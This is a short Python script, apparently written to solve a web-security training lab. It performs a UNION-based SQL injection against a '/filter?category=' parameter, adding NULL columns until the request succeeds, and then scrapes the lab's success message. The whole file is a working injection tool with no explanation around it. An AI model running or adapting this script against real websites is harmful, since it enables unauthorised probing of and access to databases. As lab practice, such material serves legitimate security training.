#!/usr/bin/python3

import re
import argparse
import requests

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', action='store', dest='url', help='The url', required=True)
    pattern = re.compile("<h4>(C.+?!)</h4>")
    args = parser.parse_args()
    url = args.url
    if url[-1:] == "/":
        url = url[:-1]

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
    
    url += "/filter?category='UNION+SELECT+NULL"
    fail = True
    while fail:
        try:
            with requests.Session() as s:
                r = s.get(url + "--", headers=headers)
                if r.status_code != 200:
                    url += ", NULL"
                else:
                    fail = False
                    print(re.findall(pattern, r.text))
        except requests.exceptions.ConnectionError as e:
                print(e)
                exit(-1)






if __name__ == "__main__":
    main()
